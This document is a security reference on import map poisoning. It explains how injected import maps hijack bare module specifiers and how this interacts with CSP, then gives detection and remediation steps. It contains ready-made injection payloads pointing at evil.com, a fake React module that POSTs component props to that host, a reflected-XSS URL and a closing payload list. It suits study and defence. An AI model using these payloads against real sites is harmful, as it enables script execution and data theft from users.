# 54 - Import Maps Poisoning

## Overview

Import maps are a browser-native mechanism (`<script type="importmap">`) that allows developers to control how JavaScript module specifiers are resolved. When an attacker can inject or modify an import map, they can redirect any bare module specifier (e.g., `import 'lodash'`) to an attacker-controlled URL, achieving arbitrary code execution. This document covers import map injection techniques, bare module specifier hijacking, and CSP interactions.

---

## 1. Import Map Fundamentals

### 1.1 How Import Maps Work

```html
<script type="importmap">
{
  "imports": {
    "lodash": "/node_modules/lodash-es/lodash.js",
    "react": "/node_modules/react/index.js",
    "utils/": "/src/utils/"
  }
}
</script>

<script type="module">
  import _ from 'lodash';  // Resolved via import map
  import React from 'react';
  import { helper } from 'utils/helper.js';
</script>
```

### 1.2 Key Properties

- Import maps must be declared **before** any module scripts
- Only **one** import map is allowed per document (subsequent ones are ignored)
- Import maps are processed by the HTML parser, not the JavaScript engine
- Bare specifiers (no `.`, `/`, or `://` prefix) are resolved exclusively through import maps
- Import maps support scoping: different mappings for different script paths

---

## 2. Import Map Injection Attack

### 2.1 Attack Vector

If an attacker can inject HTML before the application's module scripts (e.g., via reflected XSS, stored XSS, or HTML injection in a template), they can inject a malicious import map that redirects all module imports:

```html
<!-- Attacker-injected import map (must appear before any module scripts) -->
<script type="importmap">
{
  "imports": {
    "lodash": "https://evil.com/fake-lodash.js",
    "react": "https://evil.com/fake-react.js",
    "vue": "https://evil.com/fake-vue.js",
    "@angular/core": "https://evil.com/fake-angular.js"
  }
}
</script>

<!-- Application's legitimate module scripts now load attacker's code -->
```

### 2.2 Requirements

1. **HTML injection before module scripts**: The attacker must inject the import map before the first `<script type="module">` tag
2. **No existing import map**: If the application already has an import map, the attacker's injected one is ignored (browsers accept only the first)
3. **Module scripts use bare specifiers**: The application must use bare specifiers (`import 'lodash'`) rather than full URLs (`import '/node_modules/lodash/index.js'`)

### 2.3 Exploitation Scenarios

**Scenario 1 -- Reflected XSS in `<head>`**:
```
https://target.com/page?name=<script type="importmap">{"imports":{"lodash":"//evil.com/x.js"}}</script>
```
If the reflection point is in the `<head>` before module scripts, the import map is accepted.

**Scenario 2 -- Stored HTML injection**:
An attacker injects a stored XSS payload containing an import map in a CMS, wiki, or comment system that renders HTML before the application's scripts.

**Scenario 3 -- Template injection**:
Server-side template injection that allows injecting content into the `<head>` section of the HTML document.

---

## 3. Bare Module Specifier Hijacking

### 3.1 What are Bare Specifiers?

Bare specifiers are module import paths that do not start with `.`, `/`, or a URL scheme:

```javascript
// Bare specifiers (resolved via import map)
import React from 'react';
import _ from 'lodash';
import { useState } from 'react';
import { Router } from '@angular/router';

// NOT bare specifiers (resolved directly)
import { helper } from './utils/helper.js';
import { config } from '/config.js';
import lib from 'https://cdn.example.com/lib.js';
```

### 3.2 Hijacking via Import Map Override

When an attacker controls the import map, every bare specifier becomes a hijack target:

```javascript
// Attacker's fake-react.js (served from evil.com)
// Exports the real React API after stealing data
const realReact = await import('https://cdn.skypack.dev/react');

// Intercept all component renders
const originalCreateElement = realReact.createElement;
realReact.createElement = function(...args) {
  // Exfiltrate component props (may contain secrets)
  fetch('https://evil.com/props', {
    method: 'POST',
    body: JSON.stringify(args.slice(1))
  });
  return originalCreateElement.apply(this, args);
};

export default realReact;
export const { useState, useEffect, useRef } = realReact;
```

### 3.3 Scoped Import Map Injection

Import maps support scoping, allowing different mappings based on the importing script's URL:

```html
<script type="importmap">
{
  "imports": {
    "lodash": "/safe/lodash.js"
  },
  "scopes": {
    "/admin/": {
      "lodash": "https://evil.com/admin-steal.js"
    }
  }
}
</script>
```

This redirects `lodash` imports only from scripts under `/admin/`, making the attack more targeted and harder to detect.

---

## 4. CSP Interactions

### 4.1 CSP and Import Maps

Content Security Policy interacts with import maps in important ways:

- **`script-src` applies to loaded modules**: Even if an import map redirects a specifier to `evil.com`, CSP `script-src` can block the load if `evil.com` is not allowed
- **Import maps themselves are `<script>` elements**: They require `script-src 'unsafe-inline'` or a nonce/hash to be accepted
- **`strict-dynamic` and import maps**: When `strict-dynamic` is set, import maps may still function because they are parser-inserted scripts

### 4.2 CSP Bypass via Import Map

If CSP allows a CDN domain (e.g., `script-src cdn.example.com`), the attacker can redirect imports to a file they control on that CDN:

```html
<script type="importmap">
{
  "imports": {
    "app-utils": "https://cdn.example.com/user-uploads/malicious.js"
  }
}
</script>
```

### 4.3 CSP Mitigation

To prevent import map injection:

```
Content-Security-Policy: script-src 'nonce-RANDOM' 'strict-dynamic'; require-trusted-types-for 'script'
```

- Use nonces on all script tags including the import map
- `strict-dynamic` prevents parser-inserted scripts without a nonce
- Trusted Types can prevent runtime modification of import maps

---

## 5. Detection and Remediation

### 5.1 Detection

- Search for `<script type="importmap">` in HTML responses
- Check if the import map appears after user-controlled content
- Verify CSP policy covers import map script elements
- Audit HTML injection points that render before `<head>` scripts

### 5.2 Remediation

1. **Add nonce to import map**: `<script type="importmap" nonce="RANDOM">`
2. **Deploy strict CSP**: Block injection of unauthorized import maps
3. **Place import map early**: Ensure the legitimate import map appears before any user-controlled HTML
4. **Use full URLs instead of bare specifiers**: Avoid dependency on import maps for security-critical imports
5. **Subresource Integrity (SRI)**: Not yet supported for import-mapped modules, but monitor browser vendor progress

---

## 6. Import Map Poisoning Payloads

```html
<!-- IMP-01: Basic import map injection -->
<script type="importmap">
{"imports":{"react":"//evil.com/steal.js","vue":"//evil.com/steal.js","lodash":"//evil.com/steal.js"}}
</script>

<!-- IMP-02: Scoped import map targeting admin paths -->
<script type="importmap">
{"scopes":{"/admin/":{"auth":"//evil.com/auth-steal.js"}}}
</script>

<!-- IMP-03: Import map with path prefix hijacking -->
<script type="importmap">
{"imports":{"utils/":"//evil.com/fake-utils/","components/":"//evil.com/fake-components/"}}
</script>

<!-- IMP-04: Minimal import map injection (inline in reflected XSS) -->
"><script type="importmap">{"imports":{"app":"//evil.com/x.js"}}</script><script type="module">import 'app'</script>
```
